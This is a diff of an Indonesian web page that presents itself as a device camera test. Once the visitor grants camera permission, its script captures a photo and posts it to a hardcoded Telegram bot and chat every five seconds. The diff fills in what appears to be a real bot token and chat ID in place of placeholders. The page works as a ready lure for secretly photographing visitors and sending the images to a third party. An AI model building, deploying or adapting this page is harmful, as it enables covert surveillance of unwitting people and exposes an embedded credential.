@@ -1,190 +1,190 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Camera Test - Device Milikmu</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #1a1a2e;
-      color: #eee;
-      padding: 20px;
-      min-height: 100vh;
-    }
-    
-    .container {
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    
-    h1 {
-      color: #4fc3f7;
-      text-align: center;
-      margin-bottom: 8px;
-      word-break: break-word;
-    }
-    
-    .subtitle {
-      text-align: center;
-      color: #aaa;
-      font-size: 0.9em;
-      margin-bottom: 18px;
-    }
-    
-    video {
-      width: 100%;
-      border-radius: 10px;
-      background: #000;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
-      transform: scaleX(-1);
-      margin-bottom: 14px;
-    }
-    
-    .status {
-      background: #16213e;
-      border-radius: 10px;
-      padding: 14px;
-      margin-bottom: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-    }
-    
-    .status-line {
-      margin: 4px 0;
-    }
-    
-    .status-line.ok { color: #66bb6a; }
-    .status-line.err { color: #ef5350; }
-    .status-line.info { color: #aaa; }
-    
-    .hidden { display: none !important; }
-    
-    .hint {
-      text-align: center;
-      color: #888;
-      margin-top: 10px;
-      font-size: 0.9em;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>📸 Auto Camera To Telegram</h1>
-    <p class="subtitle">Grant permission untuk mulai</p>
-    
-    <div id="statusInfo" class="status">
-      <div class="status-line info">Menunggu izin kamera...</div>
-    </div>
-    
-    <video id="video" autoplay playsinline muted></video>
-    
-    <p class="hint">
-      Setelah izin diberikan, foto otomatis terkirim ke Telegram
-    </p>
-  </div>
-  
-  <canvas id="canvas" style="display:none"></canvas>
-  
-  <script>
-    const TELEGRAM_BOT_TOKEN = '<TOKEN_BOT_KAMU>';
-    const TELEGRAM_CHAT_ID = '<CHAT_ID_KAMU>';
-    const MAX_RETRIES = 3;
-    
-    let video = document.getElementById('video');
-    let canvas = document.getElementById('canvas');
-    let ctx = canvas.getContext('2d');
-    let stream = null;
-    let sending = false;
-    let attempts = 0;
-    
-    const statusInfo = document.getElementById('statusInfo');
-    
-    function log(msg, type = 'info') {
-      const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info';
-      statusInfo.innerHTML += `<div class="status-line ${cls}">${msg}</div>`;
-    }
-    
-    async function startCamera() {
-      try {
-        const s = await navigator.mediaDevices.getUserMedia({
-          video: {
-            width: { ideal: 1280 },
-            height: { ideal: 720 },
-            facingMode: 'environment'
-          }
-        });
-        
-        stream = s;
-        video.srcObject = s;
-        
-        video.onloadedmetadata = () => {
-          log('Kamera aktif', 'ok');
-          canvas.width = video.videoWidth || 1280;
-          canvas.height = video.videoHeight || 720;
-          sendToTelegram();
-        };
-      } catch (err) {
-        log('Izin kamera ditolak atau kamera tidak tersedia', 'err');
-        console.error(err);
-      }
-    }
-    
-    async function sendToTelegram() {
-      if (sending) return;
-      if (attempts >= MAX_RETRIES) {
-        log('Mencapai batas percobaan', 'err');
-        return;
-      }
-      
-      sending = true;
-      attempts++;
-      
-      try {
-        log('Mengambil foto...', 'info');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataURL = canvas.toDataURL('image/png');
-        
-        const blob = await (await fetch(dataURL)).blob();
-        const form = new FormData();
-        form.append('chat_id', TELEGRAM_CHAT_ID);
-        form.append('photo', blob, 'camera-auto.png');
-        
-        log('Mengirim ke Telegram...', 'info');
-        const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
-          method: 'POST',
-          body: form
-        });
-        
-        const data = await res.json();
-        
-        if (data.ok) {
-          log('Foto terkirim ke Telegram ✓', 'ok');
-          attempts = 0;
-          setTimeout(() => {
-            sendToTelegram();
-          }, 5000);
-        } else {
-          throw new Error(data.description || JSON.stringify(data));
-        }
-      } catch (err) {
-        log('Gagal: ' + err.message, 'err');
-        setTimeout(() => {
-          sendToTelegram();
-        }, 2000);
-      } finally {
-        sending = false;
-      }
-    }
-    
-    window.addEventListener('beforeunload', () => {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-    });
-    
-    startCamera();
-  </script>
-</body>
-</html>
+1|<!DOCTYPE html>
+2|<html lang="id">
+3|<head>
+4|  <meta charset="UTF-8">
+5|  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+6|  <title>Camera Test - Device Milikmu</title>
+7|  <style>
+8|    * { margin: 0; padding: 0; box-sizing: border-box; }
+9|    
+10|    body {
+11|      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+12|      background: #1a1a2e;
+13|      color: #eee;
+14|      padding: 20px;
+15|      min-height: 100vh;
+16|    }
+17|    
+18|    .container {
+19|      max-width: 800px;
+20|      margin: 0 auto;
+21|    }
+22|    
+23|    h1 {
+24|      color: #4fc3f7;
+25|      text-align: center;
+26|      margin-bottom: 8px;
+27|      word-break: break-word;
+28|    }
+29|    
+30|    .subtitle {
+31|      text-align: center;
+32|      color: #aaa;
+33|      font-size: 0.9em;
+34|      margin-bottom: 18px;
+35|    }
+36|    
+37|    video {
+38|      width: 100%;
+39|      border-radius: 10px;
+40|      background: #000;
+41|      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+42|      transform: scaleX(-1);
+43|      margin-bottom: 14px;
+44|    }
+45|    
+46|    .status {
+47|      background: #16213e;
+48|      border-radius: 10px;
+49|      padding: 14px;
+50|      margin-bottom: 12px;
+51|      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+52|    }
+53|    
+54|    .status-line {
+55|      margin: 4px 0;
+56|    }
+57|    
+58|    .status-line.ok { color: #66bb6a; }
+59|    .status-line.err { color: #ef5350; }
+60|    .status-line.info { color: #aaa; }
+61|    
+62|    .hidden { display: none !important; }
+63|    
+64|    .hint {
+65|      text-align: center;
+66|      color: #888;
+67|      margin-top: 10px;
+68|      font-size: 0.9em;
+69|    }
+70|  </style>
+71|</head>
+72|<body>
+73|  <div class="container">
+74|    <h1>📸 Auto Camera To Telegram</h1>
+75|    <p class="subtitle">Grant permission untuk mulai</p>
+76|    
+77|    <div id="statusInfo" class="status">
+78|      <div class="status-line info">Menunggu izin kamera...</div>
+79|    </div>
+80|    
+81|    <video id="video" autoplay playsinline muted></video>
+82|    
+83|    <p class="hint">
+84|      Setelah izin diberikan, foto otomatis terkirim ke Telegram
+85|    </p>
+86|  </div>
+87|  
+88|  <canvas id="canvas" style="display:none"></canvas>
+89|  
+90|  <script>
+91|    const TELEGRAM_BOT_TOKEN='8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY';
+92|    const TELEGRAM_CHAT_ID = '7451969762';
+93|    const MAX_RETRIES = 3;
+94|    
+95|    let video = document.getElementById('video');
+96|    let canvas = document.getElementById('canvas');
+97|    let ctx = canvas.getContext('2d');
+98|    let stream = null;
+99|    let sending = false;
+100|    let attempts = 0;
+101|    
+102|    const statusInfo = document.getElementById('statusInfo');
+103|    
+104|    function log(msg, type = 'info') {
+105|      const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info';
+106|      statusInfo.innerHTML += `<div class="status-line ${cls}">${msg}</div>`;
+107|    }
+108|    
+109|    async function startCamera() {
+110|      try {
+111|        const s = await navigator.mediaDevices.getUserMedia({
+112|          video: {
+113|            width: { ideal: 1280 },
+114|            height: { ideal: 720 },
+115|            facingMode: 'environment'
+116|          }
+117|        });
+118|        
+119|        stream = s;
+120|        video.srcObject = s;
+121|        
+122|        video.onloadedmetadata = () => {
+123|          log('Kamera aktif', 'ok');
+124|          canvas.width = video.videoWidth || 1280;
+125|          canvas.height = video.videoHeight || 720;
+126|          sendToTelegram();
+127|        };
+128|      } catch (err) {
+129|        log('Izin kamera ditolak atau kamera tidak tersedia', 'err');
+130|        console.error(err);
+131|      }
+132|    }
+133|    
+134|    async function sendToTelegram() {
+135|      if (sending) return;
+136|      if (attempts >= MAX_RETRIES) {
+137|        log('Mencapai batas percobaan', 'err');
+138|        return;
+139|      }
+140|      
+141|      sending = true;
+142|      attempts++;
+143|      
+144|      try {
+145|        log('Mengambil foto...', 'info');
+146|        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+147|        const dataURL = canvas.toDataURL('image/png');
+148|        
+149|        const blob = await (await fetch(dataURL)).blob();
+150|        const form = new FormData();
+151|        form.append('chat_id', TELEGRAM_CHAT_ID);
+152|        form.append('photo', blob, 'camera-auto.png');
+153|        
+154|        log('Mengirim ke Telegram...', 'info');
+155|        const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+156|          method: 'POST',
+157|          body: form
+158|        });
+159|        
+160|        const data = await res.json();
+161|        
+162|        if (data.ok) {
+163|          log('Foto terkirim ke Telegram ✓', 'ok');
+164|          attempts = 0;
+165|          setTimeout(() => {
+166|            sendToTelegram();
+167|          }, 5000);
+168|        } else {
+169|          throw new Error(data.description || JSON.stringify(data));
+170|        }
+171|      } catch (err) {
+172|        log('Gagal: ' + err.message, 'err');
+173|        setTimeout(() => {
+174|          sendToTelegram();
+175|        }, 2000);
+176|      } finally {
+177|        sending = false;
+178|      }
+179|    }
+180|    
+181|    window.addEventListener('beforeunload', () => {
+182|      if (stream) {
+183|        stream.getTracks().forEach(track => track.stop());
+184|      }
+185|    });
+186|    
+187|    startCamera();
+188|  </script>
+189|</body>
+190|</html>
